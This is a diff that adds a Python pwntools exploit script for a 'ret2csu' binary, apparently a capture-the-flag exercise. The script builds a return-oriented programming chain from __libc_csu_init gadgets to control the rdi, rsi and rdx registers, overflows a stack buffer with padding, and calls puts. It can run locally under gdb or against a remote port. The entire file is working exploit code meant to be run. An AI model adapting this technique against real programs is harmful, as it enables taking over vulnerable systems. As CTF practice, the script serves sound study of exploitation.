@@ -1,0 +1,115 @@
+#!/usr/bin/env python3
+from pwn import *
+
+
+fname = f'ret2csu'
+ip = '0.0.0.0'
+port = 1337
+
+#set target binary and context
+elf = context.binary = ELF(f'./{fname}')
+
+#set libc for Pwntools
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+
+
+gdbscript="""
+b *main
+b *0x0000000000401185
+c
+b *0x7ffff7e43671
+
+"""
+
+mode = 'debug'
+
+if mode == 'attach':
+    r = process(f'{fname}',aslr=False)
+
+    attach(f'{fname}',gdbscript=gdbscript)
+    #set follow-fork-mode child
+elif mode == 'debug':
+    r = gdb.debug(f'./{fname}',aslr=False,gdbscript=gdbscript)
+elif mode == 'remote':
+    r = remote(ip,port)
+
+rb = lambda x :r.recvb(x)
+rl = lambda : r.recvline()
+ru = lambda x :r.recvuntil(x)
+s = lambda x :r.send(x)
+sl = lambda x : r.sendline(x)
+sla = lambda x,y : r.sendlineafter(x,y)
+inter = lambda : r.interactive()
+
+
+def pwn():
+
+
+    putsgot = elf.got['puts']          
+    putsplt = elf.plt['puts']
+    pop_rdi = 0x00000000004011f3
+    pop_rsi_r15 = 0x00000000004011f1
+    ret = 0x4004e6
+
+
+    def ret2csu(call,rdi,rsi,rdx):
+        payload = p64(0x4011ea)         # first call popper gadget
+
+        payload += p64(0x00)            # pop rbx - set to 0 since it will be incremented later
+        payload += p64(0x01)            # pop rbp - set to 1 so when compared to the incremented rbx 
+        payload += p64(0x400000)       # pop r12 #edi only 4 bytes controll
+        payload += p64(rsi)            # pop r13 #rsi
+        payload += p64(rdx)            # pop r14 #rdx
+        payload += p64(putsgot)            # pop r15 
+
+        payload += p64(0x4011d0)        # 2nd call caller gadget
+
+            #__libc_csu_init+64     MOV        RDX,R14
+            #__libc_csu_init+67     MOV        RSI,R13
+            #__libc_csu_init+70     MOV        EDI,R12D
+
+        payload += p64(0x00)            # add rsp,0x8 padding cause __libc_csu_init+86  ADD RSP,0x8 
+
+
+            #__libc_csu_init+90     POP        RBX
+            #__libc_csu_init+91     POP        RBP
+            #__libc_csu_init+92     POP        R12
+            #__libc_csu_init+94     POP        R13
+            #__libc_csu_init+96     POP        R14
+            #__libc_csu_init+98     POP        R15
+            #__libc_csu_init+100    RET
+
+        payload += p64(0x00)            # rbx
+        payload += p64(0x00)            # rbp
+        payload += p64(0x00)            # r12
+        payload += p64(0x00)            # r13
+        payload += p64(0x00)            # r14
+        payload += p64(0x00)            # r15
+
+            #__libc_csu_init+100    RET
+
+        payload += p64(pop_rdi)        
+        payload += p64(rdi)             # update rdi with correct unconstrained content
+        payload += p64(pop_rsi_r15)     
+        payload += p64(rsi)             # update rsi with correct unconstrained content
+        payload += p64(0x00)
+
+            #we now have this registers under controll rdi,rsi,rdx,rbx,rbp,r12,r13,r14,r15
+
+        payload += p64(call)            # actual wanted function call
+        return payload
+
+
+    payload = ret2csu(putsplt, 0x7ffff7f735aa, 0x00, 0x00) # call(rdi,rsi,rdx)
+
+    rip = b'A'*0x18 
+    rop = rip + payload
+
+    sl(rop)
+    
+    inter()
+
+
+if __name__ == '__main__':
+    pwn()
